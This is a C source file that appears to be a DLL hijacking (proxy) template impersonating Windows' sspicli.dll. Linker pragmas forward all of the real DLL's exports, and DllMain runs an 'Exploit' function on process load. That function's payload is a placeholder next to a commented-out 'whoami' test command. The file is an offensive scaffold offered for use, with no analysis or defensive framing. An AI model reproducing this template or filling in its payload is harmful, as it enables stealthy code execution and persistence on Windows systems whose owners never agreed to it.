#pragma comment(linker,"/export:AcceptSecurityContext=C:\\WINDOWS\\system32\\sspicli.AcceptSecurityContext,@4")
#pragma comment(linker,"/export:AcquireCredentialsHandleA=C:\\WINDOWS\\system32\\sspicli.AcquireCredentialsHandleA,@5")
#pragma comment(linker,"/export:AcquireCredentialsHandleW=C:\\WINDOWS\\system32\\sspicli.AcquireCredentialsHandleW,@6")
#pragma comment(linker,"/export:AddCredentialsA=C:\\WINDOWS\\system32\\sspicli.AddCredentialsA,@7")
#pragma comment(linker,"/export:AddCredentialsW=C:\\WINDOWS\\system32\\sspicli.AddCredentialsW,@8")
#pragma comment(linker,"/export:AddSecurityPackageA=C:\\WINDOWS\\system32\\sspicli.AddSecurityPackageA,@9")
#pragma comment(linker,"/export:AddSecurityPackageW=C:\\WINDOWS\\system32\\sspicli.AddSecurityPackageW,@10")
#pragma comment(linker,"/export:ApplyControlToken=C:\\WINDOWS\\system32\\sspicli.ApplyControlToken,@11")
#pragma comment(linker,"/export:ChangeAccountPasswordA=C:\\WINDOWS\\system32\\sspicli.ChangeAccountPasswordA,@12")
#pragma comment(linker,"/export:ChangeAccountPasswordW=C:\\WINDOWS\\system32\\sspicli.ChangeAccountPasswordW,@13")
#pragma comment(linker,"/export:CompleteAuthToken=C:\\WINDOWS\\system32\\sspicli.CompleteAuthToken,@14")
#pragma comment(linker,"/export:CredMarshalTargetInfo=C:\\WINDOWS\\system32\\sspicli.CredMarshalTargetInfo,@15")
#pragma comment(linker,"/export:CredUnmarshalTargetInfo=C:\\WINDOWS\\system32\\sspicli.CredUnmarshalTargetInfo,@16")
#pragma comment(linker,"/export:DecryptMessage=C:\\WINDOWS\\system32\\sspicli.DecryptMessage,@17")
#pragma comment(linker,"/export:DeleteSecurityContext=C:\\WINDOWS\\system32\\sspicli.DeleteSecurityContext,@18")
#pragma comment(linker,"/export:DeleteSecurityPackageA=C:\\WINDOWS\\system32\\sspicli.DeleteSecurityPackageA,@19")
#pragma comment(linker,"/export:DeleteSecurityPackageW=C:\\WINDOWS\\system32\\sspicli.DeleteSecurityPackageW,@20")
#pragma comment(linker,"/export:EncryptMessage=C:\\WINDOWS\\system32\\sspicli.EncryptMessage,@21")
#pragma comment(linker,"/export:EnumerateSecurityPackagesA=C:\\WINDOWS\\system32\\sspicli.EnumerateSecurityPackagesA,@22")
#pragma comment(linker,"/export:EnumerateSecurityPackagesW=C:\\WINDOWS\\system32\\sspicli.EnumerateSecurityPackagesW,@23")
#pragma comment(linker,"/export:ExportSecurityContext=C:\\WINDOWS\\system32\\sspicli.ExportSecurityContext,@24")
#pragma comment(linker,"/export:FreeContextBuffer=C:\\WINDOWS\\system32\\sspicli.FreeContextBuffer,@25")
#pragma comment(linker,"/export:FreeCredentialsHandle=C:\\WINDOWS\\system32\\sspicli.FreeCredentialsHandle,@26")
#pragma comment(linker,"/export:GetSecurityUserInfo=C:\\WINDOWS\\system32\\sspicli.GetSecurityUserInfo,@27")
#pragma comment(linker,"/export:GetUserNameExA=C:\\WINDOWS\\system32\\sspicli.GetUserNameExA,@28")
#pragma comment(linker,"/export:GetUserNameExW=C:\\WINDOWS\\system32\\sspicli.GetUserNameExW,@29")
#pragma comment(linker,"/export:ImpersonateSecurityContext=C:\\WINDOWS\\system32\\sspicli.ImpersonateSecurityContext,@30")
#pragma comment(linker,"/export:ImportSecurityContextA=C:\\WINDOWS\\system32\\sspicli.ImportSecurityContextA,@31")
#pragma comment(linker,"/export:ImportSecurityContextW=C:\\WINDOWS\\system32\\sspicli.ImportSecurityContextW,@32")
#pragma comment(linker,"/export:InitSecurityInterfaceA=C:\\WINDOWS\\system32\\sspicli.InitSecurityInterfaceA,@33")
#pragma comment(linker,"/export:InitSecurityInterfaceW=C:\\WINDOWS\\system32\\sspicli.InitSecurityInterfaceW,@34")
#pragma comment(linker,"/export:InitializeSecurityContextA=C:\\WINDOWS\\system32\\sspicli.InitializeSecurityContextA,@35")
#pragma comment(linker,"/export:InitializeSecurityContextW=C:\\WINDOWS\\system32\\sspicli.InitializeSecurityContextW,@36")
#pragma comment(linker,"/export:LogonUserExExW=C:\\WINDOWS\\system32\\sspicli.LogonUserExExW,@37")
#pragma comment(linker,"/export:LsaCallAuthenticationPackage=C:\\WINDOWS\\system32\\sspicli.LsaCallAuthenticationPackage,@38")
#pragma comment(linker,"/export:LsaConnectUntrusted=C:\\WINDOWS\\system32\\sspicli.LsaConnectUntrusted,@39")
#pragma comment(linker,"/export:LsaDeregisterLogonProcess=C:\\WINDOWS\\system32\\sspicli.LsaDeregisterLogonProcess,@40")
#pragma comment(linker,"/export:LsaEnumerateLogonSessions=C:\\WINDOWS\\system32\\sspicli.LsaEnumerateLogonSessions,@41")
#pragma comment(linker,"/export:LsaFreeReturnBuffer=C:\\WINDOWS\\system32\\sspicli.LsaFreeReturnBuffer,@42")
#pragma comment(linker,"/export:LsaGetLogonSessionData=C:\\WINDOWS\\system32\\sspicli.LsaGetLogonSessionData,@43")
#pragma comment(linker,"/export:LsaLogonUser=C:\\WINDOWS\\system32\\sspicli.LsaLogonUser,@44")
#pragma comment(linker,"/export:LsaLookupAuthenticationPackage=C:\\WINDOWS\\system32\\sspicli.LsaLookupAuthenticationPackage,@45")
#pragma comment(linker,"/export:LsaRegisterLogonProcess=C:\\WINDOWS\\system32\\sspicli.LsaRegisterLogonProcess,@46")
#pragma comment(linker,"/export:LsaRegisterPolicyChangeNotification=C:\\WINDOWS\\system32\\sspicli.LsaRegisterPolicyChangeNotification,@47")
#pragma comment(linker,"/export:LsaUnregisterPolicyChangeNotification=C:\\WINDOWS\\system32\\sspicli.LsaUnregisterPolicyChangeNotification,@48")
#pragma comment(linker,"/export:MakeSignature=C:\\WINDOWS\\system32\\sspicli.MakeSignature,@49")
#pragma comment(linker,"/export:QueryContextAttributesA=C:\\WINDOWS\\system32\\sspicli.QueryContextAttributesA,@50")
#pragma comment(linker,"/export:QueryContextAttributesExA=C:\\WINDOWS\\system32\\sspicli.QueryContextAttributesExA,@51")
#pragma comment(linker,"/export:QueryContextAttributesExW=C:\\WINDOWS\\system32\\sspicli.QueryContextAttributesExW,@52")
#pragma comment(linker,"/export:QueryContextAttributesW=C:\\WINDOWS\\system32\\sspicli.QueryContextAttributesW,@53")
#pragma comment(linker,"/export:QueryCredentialsAttributesA=C:\\WINDOWS\\system32\\sspicli.QueryCredentialsAttributesA,@54")
#pragma comment(linker,"/export:QueryCredentialsAttributesExA=C:\\WINDOWS\\system32\\sspicli.QueryCredentialsAttributesExA,@55")
#pragma comment(linker,"/export:QueryCredentialsAttributesExW=C:\\WINDOWS\\system32\\sspicli.QueryCredentialsAttributesExW,@56")
#pragma comment(linker,"/export:QueryCredentialsAttributesW=C:\\WINDOWS\\system32\\sspicli.QueryCredentialsAttributesW,@57")
#pragma comment(linker,"/export:QuerySecurityContextToken=C:\\WINDOWS\\system32\\sspicli.QuerySecurityContextToken,@58")
#pragma comment(linker,"/export:QuerySecurityPackageInfoA=C:\\WINDOWS\\system32\\sspicli.QuerySecurityPackageInfoA,@59")
#pragma comment(linker,"/export:QuerySecurityPackageInfoW=C:\\WINDOWS\\system32\\sspicli.QuerySecurityPackageInfoW,@60")
#pragma comment(linker,"/export:RevertSecurityContext=C:\\WINDOWS\\system32\\sspicli.RevertSecurityContext,@61")
#pragma comment(linker,"/export:SaslAcceptSecurityContext=C:\\WINDOWS\\system32\\sspicli.SaslAcceptSecurityContext,@62")
#pragma comment(linker,"/export:SaslEnumerateProfilesA=C:\\WINDOWS\\system32\\sspicli.SaslEnumerateProfilesA,@63")
#pragma comment(linker,"/export:SaslEnumerateProfilesW=C:\\WINDOWS\\system32\\sspicli.SaslEnumerateProfilesW,@64")
#pragma comment(linker,"/export:SaslGetContextOption=C:\\WINDOWS\\system32\\sspicli.SaslGetContextOption,@65")
#pragma comment(linker,"/export:SaslGetProfilePackageA=C:\\WINDOWS\\system32\\sspicli.SaslGetProfilePackageA,@66")
#pragma comment(linker,"/export:SaslGetProfilePackageW=C:\\WINDOWS\\system32\\sspicli.SaslGetProfilePackageW,@67")
#pragma comment(linker,"/export:SaslIdentifyPackageA=C:\\WINDOWS\\system32\\sspicli.SaslIdentifyPackageA,@68")
#pragma comment(linker,"/export:SaslIdentifyPackageW=C:\\WINDOWS\\system32\\sspicli.SaslIdentifyPackageW,@69")
#pragma comment(linker,"/export:SaslInitializeSecurityContextA=C:\\WINDOWS\\system32\\sspicli.SaslInitializeSecurityContextA,@70")
#pragma comment(linker,"/export:SaslInitializeSecurityContextW=C:\\WINDOWS\\system32\\sspicli.SaslInitializeSecurityContextW,@71")
#pragma comment(linker,"/export:SaslSetContextOption=C:\\WINDOWS\\system32\\sspicli.SaslSetContextOption,@72")
#pragma comment(linker,"/export:SealMessage=C:\\WINDOWS\\system32\\sspicli.SealMessage,@73")
#pragma comment(linker,"/export:SecCacheSspiPackages=C:\\WINDOWS\\system32\\sspicli.SecCacheSspiPackages,@74")
#pragma comment(linker,"/export:SecDeleteUserModeContext=C:\\WINDOWS\\system32\\sspicli.SecDeleteUserModeContext,@1")
#pragma comment(linker,"/export:SecInitUserModeContext=C:\\WINDOWS\\system32\\sspicli.SecInitUserModeContext,@2")
#pragma comment(linker,"/export:SeciAllocateAndSetCallFlags=C:\\WINDOWS\\system32\\sspicli.SeciAllocateAndSetCallFlags,@75")
#pragma comment(linker,"/export:SeciAllocateAndSetCallTarget=C:\\WINDOWS\\system32\\sspicli.SeciAllocateAndSetCallTarget,@76")
#pragma comment(linker,"/export:SeciAllocateAndSetIPAddress=C:\\WINDOWS\\system32\\sspicli.SeciAllocateAndSetIPAddress,@77")
#pragma comment(linker,"/export:SeciFreeCallContext=C:\\WINDOWS\\system32\\sspicli.SeciFreeCallContext,@78")
#pragma comment(linker,"/export:SeciIsProtectedUser=C:\\WINDOWS\\system32\\sspicli.SeciIsProtectedUser,@79")
#pragma comment(linker,"/export:SetContextAttributesA=C:\\WINDOWS\\system32\\sspicli.SetContextAttributesA,@80")
#pragma comment(linker,"/export:SetContextAttributesW=C:\\WINDOWS\\system32\\sspicli.SetContextAttributesW,@81")
#pragma comment(linker,"/export:SetCredentialsAttributesA=C:\\WINDOWS\\system32\\sspicli.SetCredentialsAttributesA,@82")
#pragma comment(linker,"/export:SetCredentialsAttributesW=C:\\WINDOWS\\system32\\sspicli.SetCredentialsAttributesW,@83")
#pragma comment(linker,"/export:SspiCompareAuthIdentities=C:\\WINDOWS\\system32\\sspicli.SspiCompareAuthIdentities,@84")
#pragma comment(linker,"/export:SspiCopyAuthIdentity=C:\\WINDOWS\\system32\\sspicli.SspiCopyAuthIdentity,@85")
#pragma comment(linker,"/export:SspiDecryptAuthIdentity=C:\\WINDOWS\\system32\\sspicli.SspiDecryptAuthIdentity,@86")
#pragma comment(linker,"/export:SspiDecryptAuthIdentityEx=C:\\WINDOWS\\system32\\sspicli.SspiDecryptAuthIdentityEx,@87")
#pragma comment(linker,"/export:SspiEncodeAuthIdentityAsStrings=C:\\WINDOWS\\system32\\sspicli.SspiEncodeAuthIdentityAsStrings,@88")
#pragma comment(linker,"/export:SspiEncodeStringsAsAuthIdentity=C:\\WINDOWS\\system32\\sspicli.SspiEncodeStringsAsAuthIdentity,@89")
#pragma comment(linker,"/export:SspiEncryptAuthIdentity=C:\\WINDOWS\\system32\\sspicli.SspiEncryptAuthIdentity,@90")
#pragma comment(linker,"/export:SspiEncryptAuthIdentityEx=C:\\WINDOWS\\system32\\sspicli.SspiEncryptAuthIdentityEx,@91")
#pragma comment(linker,"/export:SspiExcludePackage=C:\\WINDOWS\\system32\\sspicli.SspiExcludePackage,@92")
#pragma comment(linker,"/export:SspiFreeAuthIdentity=C:\\WINDOWS\\system32\\sspicli.SspiFreeAuthIdentity,@93")
#pragma comment(linker,"/export:SspiGetComputerNameForSPN=C:\\WINDOWS\\system32\\sspicli.SspiGetComputerNameForSPN,@94")
#pragma comment(linker,"/export:SspiGetTargetHostName=C:\\WINDOWS\\system32\\sspicli.SspiGetTargetHostName,@95")
#pragma comment(linker,"/export:SspiIsAuthIdentityEncrypted=C:\\WINDOWS\\system32\\sspicli.SspiIsAuthIdentityEncrypted,@96")
#pragma comment(linker,"/export:SspiLocalFree=C:\\WINDOWS\\system32\\sspicli.SspiLocalFree,@97")
#pragma comment(linker,"/export:SspiMarshalAuthIdentity=C:\\WINDOWS\\system32\\sspicli.SspiMarshalAuthIdentity,@98")
#pragma comment(linker,"/export:SspiPrepareForCredRead=C:\\WINDOWS\\system32\\sspicli.SspiPrepareForCredRead,@99")
#pragma comment(linker,"/export:SspiPrepareForCredWrite=C:\\WINDOWS\\system32\\sspicli.SspiPrepareForCredWrite,@100")
#pragma comment(linker,"/export:SspiUnmarshalAuthIdentity=C:\\WINDOWS\\system32\\sspicli.SspiUnmarshalAuthIdentity,@101")
#pragma comment(linker,"/export:SspiUnmarshalAuthIdentityInternal=C:\\WINDOWS\\system32\\sspicli.SspiUnmarshalAuthIdentityInternal,@3")
#pragma comment(linker,"/export:SspiValidateAuthIdentity=C:\\WINDOWS\\system32\\sspicli.SspiValidateAuthIdentity,@102")
#pragma comment(linker,"/export:SspiZeroAuthIdentity=C:\\WINDOWS\\system32\\sspicli.SspiZeroAuthIdentity,@103")
#pragma comment(linker,"/export:UnsealMessage=C:\\WINDOWS\\system32\\sspicli.UnsealMessage,@104")
#pragma comment(linker,"/export:VerifySignature=C:\\WINDOWS\\system32\\sspicli.VerifySignature,@105")


#include <windows.h>

int Exploit()
{
    //("whoami > C:\\whoami.txt");
    //Payload here
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        Exploit();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}